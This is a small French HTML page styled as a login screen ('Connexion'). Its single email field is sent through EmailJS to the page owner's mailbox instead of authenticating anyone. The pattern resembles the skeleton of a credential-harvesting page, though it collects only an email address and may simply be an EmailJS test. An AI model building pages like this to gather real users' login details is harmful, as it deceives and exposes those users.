<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Connexion</title>
  <script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("7RS0UmuQ7ZaoYQniX"); // Ta Public Key
    })();
  </script>
</head>
<body>
  <h2>Connexion</h2>
  <form id="form">
    <input type="email" name="mail" placeholder="Adresse e-mail" required />
    <br /><br />
    <button type="submit">Se connecter</button>
  </form>

  <script>
    document.getElementById('form').addEventListener('submit', function(event) {
      event.preventDefault();
      alert('Formulaire soumis !');  // Pour vérifier que ça fonctionne
      emailjs.sendForm('service_sr10r5c', 'template_8izfmwz', this)
        .then(function() {
          alert('Infos envoyées !');
          document.getElementById('form').reset();
        }, function(error) {
          alert('Erreur lors de l’envoi.');
          console.log('Erreur :', error);
        });
    });
  </script>
</body>
</html>
